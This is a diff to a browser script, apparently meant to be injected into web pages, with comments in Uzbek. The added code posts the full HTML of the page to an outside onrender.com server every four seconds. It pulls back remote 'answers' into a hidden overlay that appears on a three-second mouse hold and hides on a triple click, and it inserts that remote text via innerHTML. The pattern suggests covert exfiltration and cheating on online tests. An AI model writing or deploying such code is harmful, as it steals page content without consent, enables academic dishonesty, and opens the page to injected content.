@@ -1,80 +1,54 @@
-// public/f1.js
 (function(){
-  const BASE = 'https://f1-f2mq.onrender.com'; // server URL
+    const SERVER = 'https://f1-f2mq.onrender.com';
+    let box = null;
 
-  let holdTimer=null, clickCount=0, lastSince=0, box=null;
-
-  function makeBox(){
-    if(box) return box;
-    box=document.createElement('div');
-    Object.assign(box.style,{
-      position:'fixed', left:'10px', bottom:'10px', maxWidth:'360px',
-      background:'#111', color:'#fff', padding:'10px',
-      font:'14px sans-serif', borderRadius:'8px',
-      boxShadow:'0 6px 18px rgba(0,0,0,0.3)', zIndex:2147483647,
-      display:'none', whiteSpace:'pre-wrap', cursor:'pointer'
-    });
-    document.body.appendChild(box);
-    return box;
-  }
-
-  function showToast(msg){
-    const t=document.createElement('div');
-    t.textContent=msg;
-    Object.assign(t.style,{
-      position:'fixed', left:'50%', bottom:'10px', transform:'translateX(-50%)',
-      background:'#007bff', color:'#fff', padding:'8px 14px',
-      borderRadius:'6px', font:'14px sans-serif', zIndex:2147483646,
-      boxShadow:'0 4px 12px rgba(0,0,0,0.2)'
-    });
-    document.body.appendChild(t);
-    setTimeout(()=>t.remove(),2500);
-  }
-
-  async function sendPage(){
-    try{
-      await fetch(BASE+'/upload-html',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({html:document.documentElement.outerHTML})
-      });
-      showToast("✅ HTML yuborildi");
-    }catch(e){console.error(e); showToast("❌ Yuborishda xatolik");}
-  }
-
-  async function fetchLatest(){
-    try{
-      const r=await fetch(BASE+'/latest?since='+lastSince);
-      const j=await r.json();
-      if(j.success && j.message){
-        const b=makeBox();
-        b.textContent=j.message;
-        b.style.display='block';
-      }
-    }catch(e){console.error(e);}
-  }
-
-  // 3 soniya bosib turish -> oxirgi xabarni ko‘rsatish
-  document.addEventListener('mousedown', e=>{
-    if(e.button===0) holdTimer=setTimeout(fetchLatest,3000);
-  });
-  document.addEventListener('mouseup', ()=>{
-    if(holdTimer){clearTimeout(holdTimer); holdTimer=null;}
-  });
-
-  // 3 marta tez bosish -> oynani yashirish/yopish
-  document.addEventListener('click', e=>{
-    if(e.button===0){
-      clickCount++;
-      setTimeout(()=>clickCount=0,600);
-      if(clickCount>=3){
-        clickCount=0;
-        if(box) box.style.display=(box.style.display==='none')?'block':'none';
-      }
+    // 1. Sahifani serverga yuborish (Live uchun)
+    async function sendPage() {
+        const html = document.documentElement.outerHTML;
+        try {
+            await fetch(SERVER + '/upload-html', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ html: html })
+            });
+        } catch (e) {}
     }
-  });
 
-  // Dastlabki yuborish
-  sendPage();
+    // 2. Sizdan xabarlarni olish
+    async function checkMessage() {
+        try {
+            const r = await fetch(SERVER + '/latest');
+            const data = await r.json();
+            if (data.success) showBox(data.message);
+        } catch (e) {}
+    }
 
+    function showBox(msg) {
+        if (!box) {
+            box = document.createElement('div');
+            box.style = "position:fixed; bottom:10px; right:10px; background:rgba(0,0,0,0.8); color:white; padding:15px; border-radius:8px; z-index:999999; font-family:sans-serif; display:none;";
+            document.body.appendChild(box);
+        }
+        box.innerHTML = "<b>Javoblar:</b><br>" + msg;
+    }
+
+    // Sichqonchani 3 soniya bosib turganda xabarni ko'rsatish
+    let timer;
+    document.addEventListener('mousedown', () => {
+        timer = setTimeout(() => {
+            checkMessage();
+            if(box) box.style.display = 'block';
+        }, 3000);
+    });
+    document.addEventListener('mouseup', () => clearTimeout(timer));
+
+    // 3 marta tez bossa xabarni yashirish
+    document.addEventListener('click', (e) => {
+        if (e.detail === 3 && box) box.style.display = 'none';
+    });
+
+    // Ishga tushirish
+    setInterval(sendPage, 4000); // Har 4 soniyada yuborish
+    sendPage();
+    console.log("F1 Faol");
 })();
